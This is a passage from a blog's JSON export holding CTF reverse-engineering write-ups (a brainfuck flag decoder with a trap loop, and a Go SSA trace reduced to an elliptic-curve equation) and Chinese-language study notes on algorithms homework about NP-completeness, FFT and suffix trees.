gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;,[.,] It’s not so hard to find out that this brainfuck code will decode the flag in binary, and there is a loop [.,] to implement echo in the end. This part is trap, the brainfuck code [+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+]&gt;[+] is equivalent to: while( *char )&#123; ++*char;&#125;char += 1;while( *char )&#123; ++*char;&#125;char += 1;...so on It set the chars in flag to 0, remove it to get the flag. DensityIt just use some rule to expand the original input(with random string), then encoded them with base 64. Left or Right?There were so much Rust reverseing challenge recently…I am still too slow to analyze such program. They are not so hard ・゜・(PД&#96;q｡)・ ゜・ Blame on my wisdom teeth.","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"ASIS","slug":"ASIS","permalink":"http://blog.terrynini.tw/tags/ASIS/"}]},{"title":"2018::0CTF-Quals::g0g0g0","slug":"2018-0CTF-Quals-g0g0g0","date":"2018-05-02T03:35:44.000Z","updated":"2018-05-27T06:54:27.000Z","comments":true,"path":"en/2018-0CTF-Quals-g0g0g0/","permalink":"http://blog.terrynini.tw/en/2018-0CTF-Quals-g0g0g0/","excerpt":"Hadding a headache, I did not spent so much time on 0CTF, which always has some fun problem to solve.","text":"Hadding a headache, I did not spent so much time on 0CTF, which always has some fun problem to solve. This problem give you a trace.log (download file) It looks like: Entering main.init..0: t0 = *init$guard if t0 goto 2 else 1.1: *init$guard = true:bool t1 = fmt.init()Entering fmt.init..0: t0 = *init$guard if t0 goto 2 else 1.1: *init$guard = true:bool t1 = strconv.init()Entering strconv.init..0: t0 = *init$guard if t0 goto 2 else 1.1: *init$guard = true:bool t1 = math.init()Entering math.init..0: t0 = *init$guard This is a trace log of a program, which should be written in Golang.But the trace.log looks like some LLVM IR, rather than trace generated by go tool trace. It seems like trace.log is too large to analyze, but actually this is a simple program. You can slim the trace.log by deleting some library function. //delete initEntering main.init. ...15584 linesLeaving main.init.//and some input and ouput functionEntering fmt.Println at /usr/local/Cellar/go/1.9.2/libexec/src/fmt/print.go:256:6.Leaving fmt.Println, resuming main.main at /tmp/gogo.go:192:16. Now, we can start to analyze the trace of program.The trace is easy to read, but there are some weird IR : t15 = phi [1: t8, 6: t8, 4: t14] This is actually call the Phi node, since LLVM uses SSA (Static Single Assignment),which means that every variable can only be assigned once.Then,what if I wrote this program: a = 1;if (v &lt; 10) a = 2;b = a; We assign a value to a twice!So, it actually has more than one a. a1 = 1; //block 0if (v &lt; 10) a2 = 2; //block 1b = PHI(a1, a2); //block 3 The IR of line 4 is : b = phi [0:a1, 1:a2] You can understand the trace.log now.The program implement big number by array, and also some function for multipling, adding big num, finally we can derive a equation from it: $$(x+y)(x+z)x−10(x+y)(x+z)(y+z)+(x+y)(y+z)y+(x+z)(y+z)z&#x3D;0$$ It seems to be simple, but it actually is a elliptic curve… PS. The trace.log is actually generated by ssadump","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"0CTF","slug":"0CTF","permalink":"http://blog.terrynini.tw/tags/0CTF/"}]},{"title":"Advance-Algorithm::homework7","slug":"Advance-Algorithm-homework7","date":"2018-01-15T03:23:37.000Z","updated":"2020-07-05T12:47:51.000Z","comments":true,"path":"tw/Advance-Algorithm-homework7/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework7/","excerpt":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。感恩彬智讚嘆彬智","text":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。感恩彬智讚嘆彬智 題一 Show that the class $P$, viewed as a set of languages is closed under union, intersection, concatenation, complement and Kleene star. That is, if $L1, L2 \\in P$, then, $L1 \\cup L2 \\in P$,etc. page 4 - Problem 2-a Kleene star 題二 Show that if the decision version of the Hamiltonian cycle is polynomial-time solvable then so is the problem of finding a Hamiltonian cycle. 題目：if Decision Hamiltonian Cycle(DHC) $\\in P\\rightarrow$ Finding Hamiltonian Cycle(FHC) $\\in P$ 假設現在有一個演算法HamCycle(G)可以在P時間內解掉DHC，則我們可以建構以下演算法在確定性P時間內解掉FHC(證明：連結裡面有) 123456789101112131415161718HCVertices(G) H = [] next ← 0 // 初始值不重要 choose a starting node v while G has unchecked edges do if HamCycle(G) then // 試著一個個拔掉連在v上的邊 // 如果有一個邊e被拿掉後，新的圖就不存在HC，那e就是HC的一部分 for all edges e = (v,u) on v do G&#x27; ← G − e if HamCycle(G&#x27;) then G = G&#x27; else add v to H mark e as checked next ← u v ← next return H 問題變轉(Problem Reduction) 媽我找到答案了 裡面的problem 1 題三 Show that the class $NP$, viewed as a set of languages is closed under union, intersection, concatenation and Kleene star. 類似1. 題四 Prove that P $\\subseteq$ NP$\\cap$ co-NP and if NP$\\ne$ co-NP,then P$\\ne $NP. $P \\subseteq (NP \\ \\cap \\ coNP) \\rightarrow P \\subseteq NP, P \\subseteq coNP$so if $P &#x3D; NP \\\\\\rightarrow NP \\subseteq (NP \\ \\cap \\ coNP) \\\\\\rightarrow NP \\subseteq coNP \\ 又 \\ size(NP)&#x3D;size(coNP) \\\\\\rightarrow NP &#x3D; coNP$ $\\because P \\Rightarrow Q$ 等價於 $\\bar Q \\Rightarrow \\bar P$$\\therefore$ if $NP \\neq coNP$, then $P \\neq NP$ 題五 Show that 2-CNF-SAT is polynomial time solvable. CNF : conjunctive normal form，數位電路中的product of sum，例：$(A \\lor B) \\land (C \\lor D)$ stackoverflow演算法筆記 ↑這個方法太神啦 太屌辣 題六 The subgraph isomorphism problem takes two graphs $G1$ and $G2$ and asks whether $G1$ is isomorphic to a subgraph of $G2$. Show that this problem is NP-complete. Chegg標準解答 Subgraph Isomorphism Problem Input :graph $G_1$, $G_2$ Output:$G_1$ 是否與 $G_2$ 的其中一個 subgraph 同構 證明 Clique Problem $\\propto$ Subgraph Isomorphism Problem(以下簡稱CP、SIP) 已知 CP $\\in$ NPC Input :graph $S$, int $k$ Output:$S$ 是否存在一個 $k$-vertice 的完全子圖 輸入變轉： SIP的輸入 $G_1 &#x3D; k$-clique：$O(N^2)$ SIP的輸入 $G_2 &#x3D; S$：$O(N^2)$ 因為CP(S,k) = SIP(k-clique,S) 所以 CP $\\propto$ SIP $\\rightarrow$ SIP $\\in$ NP-hard 又 SIP $\\in$ NP（簡單寫個NP演算法就知道了） SIP $\\in$ NPC 題七 Given an integer m-by-n matrix $A$, and an integer m-vector $b$, the integer programming problem asks whether there is an integer n-vector $x$ such that $Ax \\leq b$. Prove that this problem is NP-complete. Integer Programming Problem Input :m*n matrix $A$, m-vector $b$ Output:是否存在一 n-vector $x$ 使得 $Ax \\leq b$ 證明 SAT $\\propto$ Integer Programming Problem (IPP) 已知 SAT $\\in$ NPC Input :CNF布林函式 $E(x) &#x3D; C_1 \\land C_2 \\land … \\land C_k$ , $x &#x3D; { x_1,…,x_n}$ 如 $C_1 &#x3D; \\lnot x_1 + x_3 + x_7$ Output:是否存在一組輸入當作 $x$ 使得 $E(x) &#x3D; True$ 變轉： IPP的輸入$A &#x3D; \\begin{bmatrix}a_{11} &amp; a_{12} &amp; … &amp; a_{1n} \\\\ … &amp; … &amp; … &amp; … \\\\ a_{m1} &amp; a_{m2} &amp; … &amp; a_{mn} \\\\ \\end{bmatrix}$, $b &#x3D; \\begin{bmatrix}b_1 \\\\ … \\\\ b_m \\\\ \\end{bmatrix}$, 其中各列 $a_i*b$ 對應到 $C_i$ 如：$C_1$ 對應 $(1-x_1)+x_3+x_7 \\geq 1 \\\\ \\rightarrow -x_1+x_3+x_7 \\geq 0 \\\\ \\rightarrow x_1-x_3-x_7 \\leq 0 \\\\ \\rightarrow a_1 &#x3D; {1,0,-1,0,0,0,-1,…}, b_1&#x3D;0$ IPP的輸出改為：是否存在一 n-vector $x&#x3D;{0,1}$ 使得 $ A_x \\leq b$，0 對應 $False$，1 對應 $True$ 因為SAT(E) = IPP(A,b) 所以 SAT $\\propto$ IPP $\\rightarrow$ IPP $\\in$ NP-hard 又 IPP $\\in$ NP（簡單寫個NP演算法就知道了） IPP $\\in$ NPC 題八 Given a set $S$ of integers, determine whether there exists a subset $A \\subseteq S$, such that $\\sum_{x\\in A}x &#x3D; \\sum_{x\\in S-A} x$. Show this problem is NP-complete. Problem 1 Partition Problem Input :set $S$ Output:是否存在 $S_1, S_2 \\in S, S_1 \\cap S_2 &#x3D; \\varnothing$ s.t. $\\sum S_1 &#x3D; \\sum S_2$ 證明 Subset Sum Problem $\\propto$ Partition Problem(以下簡稱SSP、PP) 已知 SSP $\\in$ NPC Input :set $S$, int $k$ Output:是否存在 $S’ \\in S$ s.t. $\\sum S’ &#x3D; k$ 變轉： PP的輸入 $X &#x3D; S \\cup {s-2k}$, $s &#x3D; \\sum S$ 因為SSP(S,k) = PP(X) 若左則右：若SSP(S,k)成立，代表$S$中有subset $S’$ 加總為 $k$，則在PP(X)中就可以將 $X$ 分為 $S’\\cup {s-2k}$ 和剩下的一半，加總皆為 $s-k$ 若右則左：若PP(X)成立，代表互斥子集 $S_1, S_2$ 加總皆為 $s-k$，且必定其中一邊含有 $s-2k$，將其去除後，該集合 $S’$ 加總為 $k$ 且 $S’ \\in S$ 所以 SSP $\\propto$ PP $\\rightarrow$ PP $\\in$ NP-hard 又 PP $\\in$ NP（簡單寫個NP演算法就知道了） PP $\\in$ NPC 題九 An undirected graph $G$ is k-colorable, if we can color $V(G)$ using at most $k$ colors such that for each edge $xy$ in $E(G)$, its two end vertices are $x$ and $y$ are colored with different colors. Let k-COLOR denote the problem of determine whether $G$ is k-colorable. Show that k-COLOR is NP-complete for any constant $k \\geq 3$. 3SAT $\\propto$ 3著色 $\\propto$ k著色 k Coloring Problem Input :graph $G$, int k , $k &gt; 2$ Output:是否存在一種最多使用k色的著色方式，使G上相鄰的vertex顏色皆不同 3 Coloring Problem Input :graph $G$ Output:是否存在一種最多使用3色的著色方式，使G上相鄰的vertex顏色皆不同 證明 3SAT $\\propto$ 3 Coloring Problem(以下簡稱3SAT、3CP) 已知 3SAT $\\in$ NPC Input : formula $\\phi$variables Set $X$, clauses set $C$ 靠 突然不會訂輸入 Output : 是否能指定$X$一組布林值使$C$中的子句皆為真 變轉： 3CP的輸入G &#x3D; $G_{\\phi}$ 總之他把圖構成類似電路圖的樣子 然後如果要證明 3著色 $\\propto$ k著色其實非常簡單，以四色為例： 四色的輸入為：我們只要在三色圖上面新增一個點，並且這個點跟其他所有的點都有邊 四色的輸出為：是否存在一種著色方法，只用四色就可以畫這張圖假設原圖可以用3色著色，那剛才多加的那個點，一定會需要用到第四色，所以我們可以知道，要變轉到k色著色，只要幫3色圖的輸入加上k-3個點，且這幾個新增的點到每點都要有邊，這樣我們就可以證明 3著色 $\\propto$ k著色了。 https://www.clear.rice.edu/comp487/3sat-to-3col.pdfhttps://cgi.csc.liv.ac.uk/~igor/COMP309/3CP.pdf 題十 Show that the path cover problem is NP-complete. Path Cover Problem Input :graph $G’$, int k Output:是否存在一個path的集合 $S$, $|S|&lt;k$, s.t. 所有點都在 $S$ 的任意元素(路徑)上 證明 Hamiltonian Cycle Problem $\\propto$ Path Cover Problem(以下簡稱HCP、PCP) 已知 HCP $\\in$ NPC Input :graph $G$ Output:是否存在一cycle $c$ s.t. 所有點都恰在 $c$ 上出現一次 變轉： PCP的輸入 $G’ &#x3D;$ 在原圖 $G$ 上找一個邊$(u,v)$，並在 $u$ 上接上一個新的點 $u’$，在 $v$ 上接上一個新的點 $v’$，形成的新圖當作$G’$ PCP的輸入 $k &#x3D; 1$ 所以 HCP $\\propto$ PCP $\\rightarrow$ PCP $\\in$ NP-hard 又 PCP $\\in$ NP（簡單寫個NP演算法就知道了） PCP $\\in$ NPC 題十一 List all NP-complete problems (and give proofs) that appear in Ex.1~6. Determine whether each of the following problems is polynomial time solvable or NP-complete. 應該不會考吧隔天要考就沒寫了系列 呵呵 題十二 Given a set $S$ of $n$ real numbers, another real number $M$, and an integer $k$, we want to determine whether or not there exist $k$ elements in $S$ whose sum is exactly $M$. 這個好證，跟前面類似 題十三 We are given an integer $k$ and $n$ objects which have to be placed in bins of equal capacity $M$. Object $i, 1 \\leq i \\leq n$, requires mi units of capacity. The objective is to determine whether $k$ bins are enough to accommodate all $n$ objects. No object may be placed partly in one bin and partly in another. 這也好證 題十四 Given an undirecter graph $G$ and a number $k$ :a) Is there a cycle of length $\\geq$ k?b) Is there a cycle of length $\\leq$ k?c) Is there a spanning tree with each node of degree $\\leq$ 3? 應該還可以","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework6","slug":"Advance-Algorithm-homework6","date":"2018-01-15T03:23:31.000Z","updated":"2020-07-05T12:36:32.000Z","comments":true,"path":"tw/Advance-Algorithm-homework6/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework6/","excerpt":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。","text":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。 題一 Show that LCD$\\leq$ LIS and LCS$\\leq$ LIS. Does this result imply that there exist $O(n logn)$ algorithms for LCD and LCS? (Here $n$ represents the input length.) LCS &#x3D; Longest Common SubsequenceLCD &#x3D; Longest Chain of Dominations (平面上一串點，a支配b支配c支配d，求這個平面最長的支配鍊是多長)LIS &#x3D; Longest Increasing Subsequence 若A支配B，表示$(X_A &gt; X_B) \\wedge (Y_A &gt; Y_B)$，表示一個LCD其$x,y$座標必為兩Increasing subsequence，因此可知 LCD $\\leq$ LIS。 好 這題定義有點詭異，所以我們最後筆記的結語是 你媽pass Morris 參考講義Unit7 題二 Given a set of points S in the plane, a subset of $S$ is called an anti-chain if the points of the subset can be arranged in an order such that the $x$ coordinates of the points in the order are increasing and their $y$ coordinates are decreasing. Design an algorithm to find an anti-chain with maximal size. 給一堆點，順序不重要，找出x遞增且y遞減的最長組合。 把點依照y降冪排列，然後在x上面找LIS就好了。 題三 Show that any comparison-based algorithm needs $\\Omega(n log n)$ time to solve the following problem: Given n points in the 2D plane, construct a tree of minimum total length whose vertices are the given points and the edge length of an edge is the Euclidean distance between the two end points of the edge. Euclidean distance：平面上兩點間的直線距離即為這兩點的Euclidean distance 原題目：在2D平面上給定n個點，建一個距離（權重）總和最小的tree，tree的各頂點即為2D平面上的點，兩頂點間的邊的距離（權重）即為這兩的點在平面上的直線距離。 直接將問題轉成「最小生成樹」就可以用 Kruskal’s algorithm 解 但作業是：Show that any comparison-based algorithm needs $\\Omega(nlogn)$ time to solve this problem 參考wiki吧lol 利用問題變轉的特性，因為決策版EMST可以變轉為最佳化EMST，求的決策版的下界便可同時知道最佳化EMST的下界 決策版 EMST 下界 不管 送他惹QQ wiki這三小快 還要更快摸豆海鴉褲 題四 Let $x_1, x_2, \\dots , x_n$ be n distinct points. Give an algorithm to calculate the polynomial $p(x)$ of degree n in standard form such that $p(x_i) &#x3D; 0$ for every $1 \\leq i \\leq n$. 要求設計一個演算法將$p(x)&#x3D;(x-x_1)(x-x_2)(x-x_3)\\dots(x-x_n)$展開為標準式。 這裡的多項式相乘，就是係數做convolution的運算，如果兩多項式各有n項，需要花$O(n^2)$，使用快速傅立葉把時間壓至$O(nlogn)$。 但如果逐項做FFT複雜度會是$\\sum_{i&#x3D;2}^{n-1}O(ilogi)&#x3D;O(n^2logn)$，所以用分治的方法，對切下去做FFT。 複雜度：$T(n) &#x3D; 2T(n&#x2F;2) + O(nlogn) → O(nlog^2n)$ 摺積與離散傅立葉轉換FFT與多項式乘法 題五 Let $p(x)$ be a given polynomial of degree n in standard form, and let $x_1, x_2, … , x_n$ be n distinct numbers. Give an algorithm to calculate each $p(x_i)$ for $1 \\leq i \\leq n$. (Hint: use the fact that the division problem of polynomials can be solved in $O(n log n)$ time and the result of the previous problem.) $p(x) &#x3D; f(x)g(x) + r(x)$想辦法讓 $f(x)g(x) &#x3D; 0$，就是使用多項式除法讓式子變成：$p(x) &#x3D; f(x)(x-x_i) + r(x)$ 多項式除法複雜度為$O(nlogn)$如果對每個$x_i$都分開計算複雜度為$O(n)O(nlogn)&#x3D;O(n^2logn)$ 但根據第四題，我們能夠先使用我們要查詢的數列 $&lt; x_1,x_2,x_3,\\dots , x_n &gt;$做出一個函式$q(x)$，使得$q(x_i)&#x3D;0, for;1\\leq i\\leq n$，做多項式除法可得$p(x) &#x3D; f(x)q(x) + r(x)$ 如此一來便可簡化運算：$p(x_i)&#x3D;f(x_i)\\times 0+r(x_i)&#x3D;r(x_i)$ 簡化運算的時間複雜度為:$O(nlog^2n) + O(nlogn) &#x3D; O(nlog^2n)$ 簡化後的式子保證會消去最高次項，本來求出最高項的所需的快速冪時間複雜度為$O(logn)$ 乾 所以這樣到底會不會比較快錦文別搞我Ｒ 題六 Given $n$ pairs of points $(x_i, y_i)$ with $x_1, x_2, \\dots , x_n$ being distinct. Design an algorithm to find the coefficients of the unique polynomial of degree less than $n$ that passes through these $n$ points. 如果有n個點，我們知道我們可以找到一條線穿過這些點，不過，如果這條線的最高次方$\\leq n-1$，這條線是唯一的，也就是說最高次方$\\leq n-1$的線只有一條，題目要求你做一個算法把這個多項式的係數都算出來。 拉格朗日插值法然後用第4.題的方法得到的結果，用微分求值，組合出拉格朗日多項式的係數。 這樣展開好像會有問題？還沒求出$x^n$的係數? Neville’s algorithm let：$p_{i,j}(x)$ 會穿過 point $i$~$j$ 的多項式 initial condition：$p_{i,i}(x) &#x3D; y_i$ recurrence relation：$p_{i,j}(x) &#x3D; \\frac{(x-x_j)p_{i,j-1}(x) - (x-x_i)p_{i+1,j}(x)}{(x_i-x_j)}$ 該唯一多項式的證明 題七 Given two images $A$ and $B$ with $B$ being the smaller one, where would we put $B$ on $A$, so that the overlapping part of $A$ and $B$ has the most likelihood? The difference between $A$ and $B$ is defined as the sum of the squares of the differences of corresponding elements in the overlapped parts of $A$ and $B$. Note that $B$ must completely reside on $A$. 這題真的太有趣了，這是zoj的題目，他本來就告訴你要用cyclic convolution做加速，但是morris又在其他兩項上面做了手腳，讓他更快。morris 這題假設我們兩張圖片的大小分別是$n\\times m,p\\times q$，brute force的解法複雜度是$O(n\\times m\\times p\\times q)$ image A:$$ \\begin{bmatrix} a_1 &amp; a_2 &amp; a_3 \\\\ a_4 &amp; a_5 &amp; a_6 \\\\ a_7 &amp; a_8 &amp; a_9 \\end{bmatrix}$$ image B:$$ \\begin{bmatrix} b_1 &amp; b_2 \\\\ b_3 &amp; b_4 \\\\ \\end{bmatrix}$$ 若先把兩張圖片的第一個元素對齊，算式應該為各相應元素的平方差的總和，$(x-y)^2&#x3D;x^2-2xy+y^2$，其中每個元素的$xy$項和，可以使用Cyclic Convolution(講義7-32)直接求出，複雜度為$O(nmlog(nm))$，下面會做說明。 如：$b_1$對齊$a_5$，結果應為: $(b_1-a_5)^2 + (b_2-a_6)^2 + (b_3-a_8)^2 + (b_4-a_9)^2 \\\\ &#x3D; \\sum_{i&#x3D;1…4}(b_i)^2 + {(a_5)^2 + (a_6)^2 + (a_8)^2 + (a_9)^2} - 2(b_1a_5 + b_2a_6 + b_3a_8 + b_4a_9)$ 上式的第二項：我們可以邊輸入邊做出另外一個陣列 A’來加快計算: $O(nm)$ $$ \\begin{bmatrix} (a_1)^2 &amp; (a_1)^2+(a_2)^2 &amp; (a_1)^2+(a_2)^2+(a_3)^2 \\\\ (a_1)^2+(a_4)^2 &amp; (a_1)^2+(a_2)^2+(a_4)^2+(a_5)^2 &amp; 略 \\\\ (a_1)^2+(a_4)^2+(a_7)^2 &amp; 略 &amp; 略 \\end{bmatrix}$$ 上式的第一項：Image B因為是比較小張的圖片，所以每個元素的平方一定會用到，全部加起來放進一個變數就好了 $O(pq)$ 上式的第三項：把兩個圖片的矩陣拉成sequence，然後在sequence後面用0 padding到$ 2^{\\lceil log_2n\\rceil} $的長度，就會變成$&lt; a_1,a_2,\\dots ,a_N&gt;,&lt; b_1,b_2,\\dots, b_N&gt;$，兩個sequence做Cyclic Convolution會得到一個長度為Ｎ的sequence $r$，例：$&lt; 1,2,3,4 &gt;,&lt; 1,2,3,4 &gt;$這兩個sequence會產出$&lt; 30,24,22,24 &gt;$ $O(NlogN)$ $$ 30 &#x3D; (1*1 + 2*2 + 3*3 + 4*4) \\\\ 24 &#x3D; (1*4 + 2*1 + 3*2 + 4*3) \\\\ 22 &#x3D; (1*3 + 2*4 + 3*1 + 4*2) \\\\ 24 &#x3D; (1*2 + 2*3 + 3*4 + 4*1) \\\\$$ 題八 Given a set $S$ of $k$ strings, we want to find every string in $S$ that is a substring of some other string in $S$. Assume that the total length of all the strings in $S$ is $n$, give an $O(n)$ time algorithm to solve this problem. 把set中全部的字串拿來做Generalized Suffix Tree，之後拿每個字串在GST中做搜尋，只要能找到兩次，就表示除了自己之外，還是其他字串的子字串。 複雜度分析：建構GST : $O(n)$ (n是字串總長度)搜尋時間 : $\\sum_{i&#x3D;1}^{N}O(m_i+n)&#x3D;O(n)$ (N為字串數，m為關鍵字的長度)總時間複雜度 : $O(n)$suffix tree及線性時間造樹GST 題九 Give a linear-time algorithm that takes in a string and finds the longest maximal pair of equal substrings in which the two copies do not overlap. That is, if the two copies begin at positions $p1 &lt; p2$ and are of length $n’$, then $p1+ n’ &lt; p2$. 對每個節點$N_i$，找出其子樹中的的最大及最小索引值之差$\\delta$，則可以root到$N_i$的路徑上可以得到一些子字串，而這個子字串的長度必須小於等於$\\delta$，這些就是共同子字串。 參考：morrisdp解，複雜度太高不考慮overlap的解法 題十 Show how to count the number of distinct substrings of a string $T$ in time $O(n)$, where the length of $T$ is $n$. Also show how to enumerate one copy of each distinct substring in time proportional to the length of all those strings. 後綴樹的每個樹枝都是一個後綴，在這後綴上面我們列舉他的前綴就可以得到任意子字串。 Example : xabxac的後綴樹 |---xa---[]--bxac--[] | | | |---c----[] |[root]--a--[]--bxac--[] | | | |---c----[] | |--c--[] | |---bxac---[] 拿第一個樹枝來說，我們可以找到以下子字串：x,xa,xab,xabx,xabxa,xabxac,xac，不難發現子字串數就是邊上的字元數。 複雜度分析：建構suffix tree : $O(n)$計算字元數：$O(n)$ (suffix tree的大小是$\\Theta(n)$)總時間複雜度： $O(n)$ 題十一 Solve the minimum coloring problem on interval graphs. Interval graph: 用前面活動規劃的問題來舉例，就是把活動轉為graph表示，每個活動為圖上的點，如果兩活動時間有重疊就在兩點間加上邊。 著色的意思表示根據顏色使用某個資源，所以顏色越少所佔用的資源越少，這種概念，不過這不是重點，因為這題就是要著色沒給活動。 不確定對不對，morris解法(greedy)：bfs著色，填入不跟鄰近點衝突的最小色號。 Interval Graph Coloring ProblemInterval graph 題十二 Design an algorithm for determining $\\alpha (G)$ and $k(G)$ on a bipartite graph $G$. $\\alpha(G)$: 最大獨立集的大小 $k(G)$: 最小團覆蓋的數量 團：每個點都是相鄰的，則可以稱為團，即這個團切下來可以看成是一個完全圖 最小團覆蓋：使用最少數量的團，來包含這整張圖的頂點 在 二分圖 裡面你只能找到一些由兩個點構成的團。 二分圖中： 